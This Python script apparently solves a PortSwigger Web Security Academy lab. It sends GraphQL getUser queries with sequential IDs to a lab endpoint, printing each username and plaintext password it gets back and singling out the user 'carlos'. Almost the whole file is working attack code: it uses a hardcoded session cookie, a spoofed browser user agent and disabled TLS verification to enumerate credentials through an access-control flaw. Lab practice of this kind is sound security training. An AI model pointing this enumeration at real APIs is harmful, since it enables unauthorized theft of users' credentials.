#!/usr/bin/env python3
import requests
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "https://0af800cf04441d0280c3bcd600a000ff.web-security-academy.net/graphql/v1"
SESSION = "UqjMqFkSIg2o9XrZ3hBqKBbmjXYGtPVA"

headers = {
    "Cookie": f"session={SESSION}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
}

print("[*] Attempting to extract user data...\n")

# Try to query users by ID
for user_id in range(1, 10):
    query = {
        "query": f"""
        query getUser {{
            getUser(id: {user_id}) {{
                id
                username
                password
            }}
        }}
        """
    }

    response = requests.post(TARGET, headers=headers, json=query, verify=False)

    if response.status_code == 200:
        data = response.json()

        if 'errors' in data:
            continue

        user = data.get('data', {}).get('getUser')
        if user:
            print(f"[+] User ID {user_id}:")
            print(f"    Username: {user.get('username')}")
            print(f"    Password: {user.get('password')}")
            print()

            if user.get('username') == 'carlos':
                print(f"🎯 Found carlos's credentials!")
                print(f"    Username: carlos")
                print(f"    Password: {user.get('password')}")
                print()

print("\n[*] Scan complete")
